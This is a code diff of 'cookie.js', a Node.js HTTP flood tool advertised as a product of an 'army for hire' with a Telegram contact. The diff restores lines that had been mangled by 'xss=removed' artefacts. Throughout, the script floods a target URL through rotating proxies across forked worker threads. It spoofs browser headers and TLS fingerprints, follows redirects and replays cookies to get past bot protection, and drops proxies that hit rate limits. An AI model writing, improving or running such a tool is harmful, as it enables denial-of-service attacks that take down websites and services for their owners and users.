@@ -50,7 +50,53 @@ defaultCiphers.slice(3)
 
 let ratelimit = [];
 
-if (process.argv.length < 7 xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed> option.flag === flag);
+if (process.argv.length < 7) {
+    console.clear();
+    console.log(`
+                ${'ATLAS API corporation'.red} | ${'an army for hire'.white}
+
+                            ${' 21 March, 2024 '.bgWhite.black.italic}
+
+    ${'telegram'.bold}:                ${'t.me/benshii'.bold.cyan}
+    ${'product'.bold}:                 ${'cookie (v1.0)'.bold.magenta}
+
+    ${'usage'.bold}:
+        node cookie.js [url] [time] [rate] [threads] [proxy]
+
+    ${'options'.bold}:
+        --debug         ${'true'.green}/${'false'.red}   ~   ${'Enable advanced debugging.'.italic}
+        --redirect      ${'true'.green}/${'false'.red}   ~   ${'Enable redirect system.'.italic}
+        --ratelimit     ${'true'.green}/${'false'.red}   ~   ${'Enable ratelimit system.'.italic}
+        --query         ${'true'.green}/${'false'.red}   ~   ${'Enable random queries.'.italic}
+    `);
+    process.exit(0);
+}
+
+const target = process.argv[2]// || 'https://localhost:443';
+const duration = parseInt(process.argv[3]) || 60;
+const threads = parseInt(process.argv[4]) || 10;
+const rate = parseInt(process.argv[5]) || 64;
+const proxyfile = process.argv[6] || 'proxies.txt';
+
+var parsed = url.parse(target);
+
+var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
+
+function get_option(flag) {
+    const index = process.argv.indexOf(flag);
+    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
+}
+  
+const options = [
+    { flag: '--debug', value: get_option('--debug') },
+    { flag: '--redirect', value: get_option('--redirect') },
+    { flag: '--ratelimit', value: get_option('--ratelimit') },
+    { flag: '--query', value: get_option('--query') },
+];
+
+function enabled(buf) {
+    var flag = `--${buf}`;
+    const option = options.find(option => option.flag === flag);
 
     if (option === undefined) { return false; }
 
@@ -75,7 +121,7 @@ if (process.argv.length < 7 xss=removed xss=removed xss=removed xss=removed xss=
 
 const lang_header = [
     'en-US,en;q=0.9',
- 'en-GB,en;q=0.9',
+	'en-GB,en;q=0.9',
     "en-US,en;q=0.5"
 ]
 
@@ -164,16 +210,83 @@ function random_string(minLength, maxLength) {
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
     let result = '';
-    for (let i = 0; i < length xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed> currentTime - limit.timestamp &lt;= 60000);
+    for (let i = 0; i < length; i++) {
+        const randomIndex = Math.floor(Math.random() * characters.length);
+        result += characters[randomIndex];
+    }
+    return result;
+}
+
+function ja3(socket) {
+    const cipherInfo = socket.getCipher();
+	const supportedVersions = socket.getProtocol();
+	  
+		if (!cipherInfo) {
+		  return null;
+        }
+		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
+	  
+		const md5Hash = crypto.createHash('md5');
+		md5Hash.update(ja3String);
+	  
+		return md5Hash.digest('hex');
+}
+
+function _tlsSocket(parsed, socket) {
+    const tls_socket = tls.connect({
+        host: parsed.host,
+        ciphers: ciphers,
+        servername: parsed.host,
+        secure: true,
+        requestCert: true,
+        rejectUnauthorized: false,
+        maxRedirects: 20,
+        followAllRedirects: true,
+        minVersion: 'TLSv1.2',
+        maxVersion: 'TLSv1.3',
+        ALPNProtocols: ['h2', 'http/1.1'],
+        sessionTimeout: 5000,
+        honorCipherOrder: true,
+        socket: socket,
+    });
+    tls_socket.setKeepAlive(true, 600000 * 1000);
+      
+    return tls_socket;
+}
+
+async function attack(){
+        const currentTime = Date.now();
+        ratelimit = ratelimit.filter(limit => currentTime - limit.timestamp <= 60000);
         (() => {
             const currentTime = Date.now();
-            ratelimit = ratelimit.filter(limit => currentTime - limit.timestamp &lt;= 60000);
+            ratelimit = ratelimit.filter(limit => currentTime - limit.timestamp <= 60000);
         })();
         let proxy;
         do {
             proxy = proxies[Math.floor(Math.random() * proxies.length)];
             proxy = proxy.split(':');
-        } while (ratelimit.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000 xss=removed xss=removed> {
+        } while (ratelimit.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000));
+
+        const agent = new http.Agent({
+            keepAlive: true,
+            maxFreeSockets: Infinity,
+            keepAliveMsecs: Infinity,
+            maxSockets: Infinity,
+            maxTotalSockets: Infinity
+        });
+        http.request({
+            host: proxy[0],
+            agent: agent,
+            globalAgent: agent,
+            port: proxy[1],
+            headers: {
+                'Host': parsed.host,
+                'Proxy-Connection': 'Keep-Alive',
+                'Connection': 'Keep-Alive',
+            },
+            method: 'CONNECT',
+            path: parsed.host,
+        }).on("connect", async (res, socket) => {
             if (res.statusCode === 200) {
                 const header = random_ua_v2();
                 //console.log("header:", header);
@@ -190,7 +303,15 @@ function random_string(minLength, maxLength) {
                     "Sec-Ch-Ua-Mobile": "?0",
                     "Sec-Ch-Ua-Platform": `\"${header.platform}\"`,
                     "Sec-Fetch-Site": "none",
-                    ...(Math.random() < 0 xss=removed xss=removed> {
+                    ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
+                    ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
+                    ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
+                    "Upgrade-Insecure-Requests": "1",
+                };
+                socket.setKeepAlive(true, 100000);
+                const tls_socket = _tlsSocket(parsed, socket);
+
+                await tls_socket.on('secureConnect', async () => {
                     const ja3fingerprint = await ja3(tls_socket);
                     //console.log("fingerprint:", ja3fingerprint)
                     headers["ja3"] = ja3fingerprint;
@@ -219,9 +340,42 @@ function random_string(minLength, maxLength) {
                             req.on("response", (res) => {
                                 const status = res[':status'];
                                 let coloredStatus;
-                                    if (status < 500>= 400 && status !== 404) {
+                                    if (status < 500 && status >= 400 && status !== 404) {
                                         coloredStatus = status.toString().red;
-                                    } else if (status >= 300 && status < 400 xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed> 300 && status < 400 xss=removed xss=removed xss=removed xss=removed xss=removed> ${redirectedParsed.href}`)
+                                    } else if (status >= 300 && status < 400) {
+                                        coloredStatus = status.toString().yellow;
+                                    } else if (status == 503) {
+                                        coloredStatus = status.toString().cyan;
+                                    } else {
+                                        coloredStatus = status.toString().green;
+                                    }
+
+                                if (enabled('debug')) {
+                                    if (headers["cookie"] !== undefined) {
+                                        console.log(`[${'js/cookie'.bold.magenta}] | ${colors.cyan(`${proxy[0]}:${proxy[1]}`.underline)}, ${headers[':authority']}${headers[':path']}, ${`${headers['cookie']}`.green.underline}, ${'Status'.bold}: ${coloredStatus}`);
+                                    } else {
+                                        console.log(`[${'js/cookie'.bold.magenta}] | ${colors.cyan(`${proxy[0]}:${proxy[1]}`.underline)}, ${headers[':authority']}${headers[':path']}, ${'Status'.bold}: ${coloredStatus}`);
+                                    }
+                                }
+
+                                if (status === 429 && enabled('ratelimit')) {
+                                    ratelimit.push({proxy: proxy, timestamp: Date.now()});
+                                    //console.log(ratelimit.length);
+                                    client.destroy();
+                                    return;
+                                } else if (status > 300 && status < 400 && res["set-cookie"]) {
+                                    const _cookie = res["set-cookie"];
+                                    const redirect = res["location"];
+                                    const redirectedUrl = new URL(redirect, parsed.href);
+                                                        const redirectedParsed = {
+                                                            host: redirectedUrl.host,
+                                                            path: redirectedUrl.pathname,
+                                                            href: redirectedUrl.href
+                                                        };
+                                    if (enabled('redirect')) {
+                                        if (parsed.href !== redirectedParsed.href) {
+                                            if (enabled('debug')) {
+                                                console.log(`[${'js/cookie'.bold.magenta}] | ${colors.cyan.underline(proxy)} ${'Redirect'.bold}: ${parsed.href} -> ${redirectedParsed.href}`)
                                             }
                                             headers[":path"] = redirectedParsed.path
                                             headers[":authority"] = redirectedParsed.host;
@@ -232,7 +386,18 @@ function random_string(minLength, maxLength) {
                                         }
                                     }
                                     headers["cookie"] = _cookie.join('; ');
-                                } else if (status > 300 && status < 400 xss=removed xss=removed xss=removed xss=removed> ${redirectedParsed.href}`)
+                                } else if (status > 300 && status < 400 && !res["set-cookie"]) {
+                                    const redirect = res["location"];
+                                    const redirectedUrl = new URL(redirect, parsed.href);
+                                                        const redirectedParsed = {
+                                                            host: redirectedUrl.host,
+                                                            path: redirectedUrl.pathname,
+                                                            href: redirectedUrl.href
+                                                        };
+                                    if (enabled('redirect')) {
+                                        if (parsed.href !== redirectedParsed.href) {
+                                            if (enabled('debug')) {
+                                                console.log(`[${'js/cookie'.bold.magenta}] | ${colors.cyan.underline(proxy)} ${'Redirect'.bold}: ${parsed.href} -> ${redirectedParsed.href}`)
                                             }
                                             headers[":path"] = redirectedParsed.path
                                             headers[":authority"] = redirectedParsed.host;
@@ -278,7 +443,10 @@ if (cluster.isMaster){
     console.log("-".red, "Threads:".bold, "[".red, `${threads}`.underline, "]".red);
     console.log("-".red, "Rate:".bold, "[".red, `${rate}`.underline, "]".red);
     console.log("-".red, "Proxy:".bold, "[".red, `${proxyfile}`.underline, "]".red);
-    for (let i = 0; i < threads xss=removed> {
+    for (let i = 0; i < threads; i++){
+        cluster.fork();
+    }
+    setTimeout(() => {
         console.log("attack ended");
         process.exit(1);
     }, duration * 1000);
@@ -288,4 +456,5 @@ if (cluster.isMaster){
         clearInterval(interval)
         process.exit(1);
     }, duration * 1000);
-}
+                 }
+         
